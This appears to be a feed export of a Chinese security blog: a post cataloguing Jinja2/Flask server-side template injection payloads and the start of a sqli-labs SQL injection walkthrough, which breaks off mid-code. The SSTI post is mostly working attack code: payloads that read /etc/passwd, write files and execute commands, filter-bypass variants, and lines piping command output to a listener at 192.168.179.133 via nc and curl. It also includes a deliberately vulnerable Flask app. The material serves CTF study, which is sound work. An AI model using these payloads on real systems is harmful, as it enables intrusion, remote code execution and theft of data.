<span class="keyword">if</span> (PHP_INT_SIZE == <span class="number">4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'32-bit version of PHP'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'PHP_INT_SIZE'</span> . PHP_INT_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://bugs.php.net/bug.php?id=69892" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=69892</a></p><p><a href="http://blog.evalbug.com/2015/11/10/different_arrays_compare_indentical_due_to_integer_key_truncation/" target="_blank" rel="noopener">http://blog.evalbug.com/2015/11/10/different_arrays_compare_indentical_due_to_integer_key_truncation/</a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>骚姿势，一天学四个，嘿嘿！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;划水划累了，学习一哈。&lt;/p&gt;
&lt;h2 id=&quot;escapeshellarg-escapeshellcmd&quot;&gt;&lt;a href=&quot;#escap
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>初探SSTI</title>
    <link href="https://www.sketchplane.top/2019/10/23/%E5%88%9D%E6%8E%A2SSTI/"/>
    <id>https://www.sketchplane.top/2019/10/23/%E5%88%9D%E6%8E%A2SSTI/</id>
    <published>2019-10-23T15:48:44.000Z</published>
    <updated>2019-10-24T07:51:49.694Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近需要加紧修炼，听取师傅建议，博文还是当作笔记来看待，自己能看懂即可。</p><p>如有问题欢迎指教 : ) </p><p><code>QICQ：1609410364</code></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><table><thead><tr><th>名称</th><th>介绍</th></tr></thead><tbody><tr><td><code>__dict__</code></td><td>这个属性中存放着类的属性和方法对应的键值对,实测module也有这个属性</td></tr><tr><td><code>__class__</code></td><td>返回一个实例对应的类型</td></tr><tr><td><code>__base__</code></td><td>返回一个类所继承的基类</td></tr><tr><td><code>__subclasses__()</code></td><td>返回该类的所有子类</td></tr><tr><td><code>__mro__</code></td><td>python支持多重继承，在解析<code>__init__</code>时，定义解析顺序的是子类的<code>__mro__</code>属性（值是类的元组）</td></tr><tr><td><code>__slots__</code></td><td>限制类动态添加属性</td></tr><tr><td><code>__getattribute__()</code></td><td>获取属性或方法，对模块和类都有效</td></tr><tr><td><code>__getitem__()</code></td><td>以索引取值或者键取值</td></tr><tr><td><code>__globals__</code></td><td>返回函数所在模块命名空间中的所有变量</td></tr></tbody></table><h2 id="SSTI-判断流程"><a href="#SSTI-判断流程" class="headerlink" title="SSTI 判断流程"></a>SSTI 判断流程</h2><p><img src="https://s2.ax1x.com/2019/07/06/Z0NUje.png" alt=""></p><h2 id="payload-under-python2"><a href="#payload-under-python2" class="headerlink" title="payload under python2"></a>payload under python2</h2><h3 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure><p>PS：由于python3已经移除了file类，所以是找不到file类的，可以自己写个脚本确认一下。</p><h3 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/home/adu1t/Desktop/test.txt'</span>,<span class="string">'w'</span>).write(<span class="string">'sketch_pl4ne_wants_a_girlfriend'</span>)</span><br></pre></td></tr></table></figure><p>只是换个函数，就不多讲了。</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'whoami'</span>).read()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">73</span>].__init__.__globals__[<span class="string">'os'</span>].popen(<span class="string">'whoami'</span>).read()</span><br></pre></td></tr></table></figure><p>思路就是从对象回溯到<code>object</code>类，然后再向下找<code>os</code>类，直接fuzz获取存在<code>os</code>模块的类的索引即可。</p><p>通用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># popen().read()回显命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)</span><br></pre></td></tr></table></figure><p>对于没有回显的函数可以用无回显命令执行的思路</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># system返回int型值，不回显命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').system('whoami| nc 192.168.179.133 2333')"</span>)</span><br><span class="line"><span class="comment"># VPS</span></span><br><span class="line">nc -lvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><p>思路差不多，不过是找<code>builtins</code>类，在py2与py3都存在，只是可利用的类的位置有差异。</p><h2 id="payload-under-python3"><a href="#payload-under-python3" class="headerlink" title="payload under python3"></a>payload under python3</h2><h3 id="命令执行-1"><a href="#命令执行-1" class="headerlink" title="命令执行"></a>命令执行</h3><p>通用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">64</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)</span><br></pre></td></tr></table></figure><p>PS：这里思路是寻找<code>builtins</code>类，通过内置方法走一个命令执行，由于py2与py3在这个类上区别并不大，所以这个方法的理论上是通用的。</p><p>我们只需要在不同环境fuzz出子类中存在<code>builtins</code>这个模块的类的即可。</p><h2 id="Bypass-tricks"><a href="#Bypass-tricks" class="headerlink" title="Bypass tricks"></a>Bypass tricks</h2><p>原理5分钟，Bypass两小时。</p><h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc'</span>+<span class="string">'/passwd'</span>).read()</span><br></pre></td></tr></table></figure><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原语句</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('whoami').read()"</span>)</span><br><span class="line"><span class="comment"># 编码后</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">58</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'ZXZhbA=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">"X19pbXBvcnRfXygnb3MnKS5wb3Blbignd2hvYW1pJykucmVhZCgp"</span>.decode(<span class="string">'base64'</span>))</span><br></pre></td></tr></table></figure><p>同理也可以进行其他种类编码。</p><h3 id="Bypass-中括号"><a href="#Bypass-中括号" class="headerlink" title="Bypass 中括号"></a>Bypass 中括号</h3><p>读文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">40</span>)(<span class="string">'/etc/passwd'</span>).read()</span><br></pre></td></tr></table></figure><p>命令执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通用 __builtins__</span></span><br><span class="line">().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">58</span>).__init__.__globals__.__builtins__.eval(<span class="string">"__import__('os').popen('whoami').read()"</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os.popen().read()</span></span><br><span class="line">().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.values().__getitem__(<span class="number">-2</span>).popen(<span class="string">'ls'</span>).read()</span><br></pre></td></tr></table></figure><p>这里我们还可以进一步bypass掉单引号 ; )</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.chr</span><br><span class="line">%&#125;&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.os.popen(chr(<span class="number">108</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>如果<code>os</code>被过滤了，那很自然想到用<code>values()</code>找到它</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.chr</span><br><span class="line">%&#125;&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.values().__getitem__(<span class="number">-2</span>).popen(chr(<span class="number">108</span>)%<span class="number">2</span>bchr(<span class="number">115</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>如果<code>chr()</code>也被过滤了呢？我们可能会开始考虑从其他地方拿字符出来拼接：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os.popen('ls').read()</span></span><br><span class="line">&#123;% set str=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.str</span><br><span class="line">%&#125;&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.os.popen(str(().__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">7</span>)).__getitem__(<span class="number">7</span>)%<span class="number">2</span>bstr(().__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">7</span>)).__getitem__(<span class="number">9</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>由于GET传参是有长度限制的，另外一个个去找字符拼接命令太沙雕了，是不是到这就为止了呢？</p><p>nono哒哟！<strong>或许我们可以寻找一个专门包含字符集的模块？</strong><code>string</code>模块显然符合我们的要求，那么问题就是能否在payload中导入这个模块了，这里由于女神找我聊天，挖个坑，相信成功的话就又是一个有趣的姿势了。</p><p>事实上，我们完全可以取一个别名来绕过这一限制（没想到吧hhh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set sketch_pl4ne=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__builtins__.chr</span><br><span class="line">%&#125;&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">71</span>).__init__.__globals__.values().__getitem__(<span class="number">-2</span>).popen(sketch_pl4ne(<span class="number">108</span>)%<span class="number">2</span>bsketch_pl4ne(<span class="number">115</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Bypass-下划线"><a href="#Bypass-下划线" class="headerlink" title="Bypass 下划线"></a>Bypass 下划线</h3><p>这里采用 <code>request.args.param</code>将参数外带，适用于只对指定参数进行检测的过滤规则。</p><p><strong>PS：<code>request</code>基本可以bypass许多的限制，绝不仅仅局限于下划线。</strong></p><p>读文件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line"><span class="string">''</span>[request.args<span class="class">.<span class="keyword">class</span>][<span class="title">request</span>.<span class="title">args</span>.<span class="title">mro</span>][-1][<span class="title">request</span>.<span class="title">args</span>.<span class="title">subclasses</span>]<span class="params">()</span>[40]<span class="params">(request.args.payload)</span>.<span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="class">&#125;&#125;</span></span><br><span class="line">&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__&amp;payload=/etc/passwd</span><br></pre></td></tr></table></figure><h3 id="Bypass-左双花括号"><a href="#Bypass-左双花括号" class="headerlink" title="Bypass 左双花括号"></a>Bypass 左双花括号</h3><p>使用到了无回显的命令执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">'curl http://192.168.179.133:2333/?i=`whoami`'</span>).read()==<span class="string">'p'</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br><span class="line"><span class="comment"># VPS</span></span><br><span class="line">nc -lvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><h3 id="其他姿势"><a href="#其他姿势" class="headerlink" title="其他姿势"></a>其他姿势</h3><h4 id="无-globals-命令执行"><a href="#无-globals-命令执行" class="headerlink" title="无__globals__命令执行"></a>无__globals__命令执行</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">59</span>]()._module.linecache.os.popen(<span class="string">'ls'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="加载自定义模块"><a href="#加载自定义模块" class="headerlink" title="加载自定义模块"></a>加载自定义模块</h4><p>写入配置文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload1</span></span><br><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/evil'</span>, <span class="string">'w'</span>).write(<span class="string">'from os import system%0aCMD = system'</span>) &#125;&#125;</span><br><span class="line"><span class="comment"># payload2</span></span><br><span class="line">&#123;&#123; <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/tmp/evil'</span>, <span class="string">'w'</span>).write(<span class="string">'from subprocess import check_output%0aRUNCMD=check_output'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><p>利用<code>config.from_pyfile(&#39;file_name&#39;)</code>加载文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config.from_pyfile(<span class="string">'/tmp/evil'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure><p>命令执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; config[<span class="string">'CMD'</span>](<span class="string">'whoami | nc 192.168.179.133 2333'</span>) &#125;&#125;</span><br><span class="line"><span class="comment"># VPS</span></span><br><span class="line">nc -lvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><h4 id="控制语句Fuzz脚本"><a href="#控制语句Fuzz脚本" class="headerlink" title="控制语句Fuzz脚本"></a>控制语句Fuzz脚本</h4><p>用于快速锁定所需模块的位置（因为题目环境可能和本地有所差异，人工Fuzz费时费力）</p><h2 id="Some-scripts"><a href="#Some-scripts" class="headerlink" title="Some scripts"></a>Some scripts</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    print(name)</span><br><span class="line"></span><br><span class="line">    blacklist = []</span><br><span class="line">    <span class="keyword">for</span> bad_string <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> bad_string <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"Oh, such a shame, &#123;&#125; is not allowed ;)"</span>.format(bad_string)</span><br><span class="line"></span><br><span class="line">    template = <span class="string">'&lt;h1&gt;hello &#123;&#125;!&lt;/h1&gt;'</span>.format(name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><h3 id="Fuzz-py2"><a href="#Fuzz-py2" class="headerlink" title="Fuzz_py2"></a>Fuzz_py2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># 寻找有os类的object子类</span></span><br><span class="line">search = <span class="string">'os'</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="Fuzz-all"><a href="#Fuzz-all" class="headerlink" title="Fuzz_all"></a>Fuzz_all</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="comment"># 切换运行python版本即可获取所需模块的索引</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'__builtins__'</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="控制语句Fuzz"><a href="#控制语句Fuzz" class="headerlink" title="控制语句Fuzz"></a>控制语句Fuzz</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接插在注入点即可</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("id").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p><p><a href="https://www.smi1e.top/flask-jinja2-ssti-%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">https://www.smi1e.top/flask-jinja2-ssti-%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://www.anquanke.com/post/id/188172#h3-14" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188172#h3-14</a></p><p><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/120/</a></p><p><a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/</a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>女神脱单了。。也没什么好遗憾的，女神幸福就好，祝他们早日分手吧= =</p><p>她真的是，很特别的那种，实话说她长相一般，但是她的性格，仿佛能驱散我内心的抑郁。</p><p>还有一些小坑以及几道题以及前置知识，下次再说，准备比赛了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近需要加紧修炼，听取师傅建议，博文还是当作笔记来看待，自己能看懂即可。&lt;/p&gt;
&lt;p&gt;如有问题欢迎指教 : ) &lt;/p&gt;
&lt;p&gt;&lt;code
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs速刷通关</title>
    <link href="https://www.sketchplane.top/2019/10/08/SQLI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.sketchplane.top/2019/10/08/SQLI%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2019-10-08T15:10:04.000Z</published>
    <updated>2019-10-09T15:58:13.873Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>博主本质：日更(×) 日咕(✓)</p><p>目前记录到Less-22 :-)</p><p>Creeper?</p><p>Awww man.</p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,database() --+</span><br></pre></td></tr></table></figure><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,2,user() --+</span><br></pre></td></tr></table></figure><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1') union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">user</span>() <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;  <span class="comment">// 加了双引号，单引号不被解析</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&quot;) union select 1,2,database() --+</span><br></pre></td></tr></table></figure><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p><strong>考察点：布尔盲注、报错注入</strong></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span 